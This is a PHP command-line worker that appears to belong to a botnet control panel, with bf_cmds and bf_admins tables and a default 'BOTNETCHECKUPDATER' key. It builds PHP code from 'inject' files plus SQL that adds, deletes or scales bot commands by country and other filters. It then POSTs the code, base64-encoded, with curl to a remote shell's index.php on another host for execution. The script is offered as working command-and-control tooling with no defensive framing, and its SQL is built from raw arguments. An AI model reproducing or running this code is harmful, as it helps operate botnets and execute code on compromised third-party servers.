#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

if(file_exists('../cache/dirs_autocmd.json')) $dir = json_decode(file_get_contents('../cache/dirs_autocmd.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	file_put_contents($dir['site'] . 'cache/dirs_autocmd.json', json_encode($dir));
}

ini_set('error_log', $dir['site'] . 'cache/error_autocmd_file.txt');
function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8 && !strpos($file, 'geoip.inc')) file_put_contents($dir['site'] . 'cache/error_autocmd_file.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	exec($dir['script'] . 'pv.exe -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

include_once($dir['site'] . 'includes/config.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

if(empty($_SERVER['argv'][1])){
	error_log('EMPTY_ID!',4);
	exit;
}

$MYPID = getmypid();
if(!empty($MYPID)){
	$thread = $mysqli->query('SELECT * FROM bf_threads WHERE (id = \''.$_SERVER['argv'][1].'\') LIMIT 1');
	if($thread->id != $_SERVER['argv'][1]){
		error_log('NOT_ID!',4);
		exit;
	}else{
		$mysqli->query('update bf_threads set pid = \''.$MYPID.'\', status = \'2\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	}
}else{
	error_log('PID_ERROR',4);
    exit;
}

$task = $mysqli->query('SELECT a.*, b.link, b.keyid, b.shell FROM bf_cmds a, bf_admins b WHERE (a.id = \''.$thread->post_id.'\') AND (b.id = a.post_id) LIMIT 1');
if($task->id != $thread->post_id){
	error_log('Cmd not found.',4);
	exit;
}

function get_http($link, $data, $key = 'BOTNETCHECKUPDATER1234567893', $shell = '/set/task.html'){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://' . $link . '/index.php');
	curl_setopt($ch, CURLOPT_FAILONERROR, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_TIMEOUT, 600);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Expect:' ) );
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$key.'&data=' . base64_encode(bin2hex($data)));
	$return =  curl_exec($ch);
	curl_close($ch);
	return $return;
}

$get_php = '$cur_file = \''.$task->shell.'\';';
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/mysqli.php');
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/functions.php');


$time = time();
if($task->increase == '0'){
	if(($time - $task->last_time) >= $task->sleep){
		$get_php .= '$mysqli->real_query("DELETE FROM bf_cmds WHERE (prefix = \''.$task->prefix.'\') AND (country = \''.$task->country.'\') AND (online = \''.$task->online.'\') AND (cmd = \''.$task->cmd.'\') AND (lt = \''.$task->lt.'\') AND (max  = \''.$task->max.'\') AND (enable  = \''.$task->enable.'\') AND (dev  = \''.$task->dev.'\') LIMIT 1");';
		$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$task->prefix.'\', \''.$task->country.'\', \''.$task->online.'\', \''.$task->cmd.'\', \''.$task->lt.'\', \''.$task->max.'\', \''.$task->dev.'\', \'-1\', \''.$time.'\')");';
		$get_php .= 'print(\'OK\');';
		if(get_http($task->link, $get_php, $task->keyid, $task->shell) == 'OK'){
			$mysqli->query('update bf_cmds set post_date = \''.$time.'\', last_time = \''.$time.'\' WHERE (id = \''.$task->id.'\') LIMIT 1');
		}
	}
}else{
	if(($time - $task->last_time) >= $task->sleep){
		$get_php .= '$mysqli->query("update bf_cmds set max = CEILING(max '.$task->increase.') WHERE (prefix = \''.$task->prefix.'\') AND (country = \''.$task->country.'\') AND (online = \''.$task->online.'\') AND (cmd = \''.$task->cmd.'\') AND (lt = \''.$task->lt.'\') AND (max  = \''.$task->max.'\') AND (enable  = \''.$task->enable.'\') AND (dev  = \''.$task->dev.'\') LIMIT 1");';
		$get_php .= 'print(\'OK\');';
		if(get_http($task->link, $get_php, $task->keyid, $task->shell) == 'OK'){
			$mysqli->query('update bf_cmds set max = CEILING(max '.$task->increase.'), last_time = \''.$time.'\' WHERE (id = \''.$task->id.'\') LIMIT 1');
		}
	}
}


sleep(1);

$mysqli->query('update bf_threads set status = \'255\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');

exit;

?>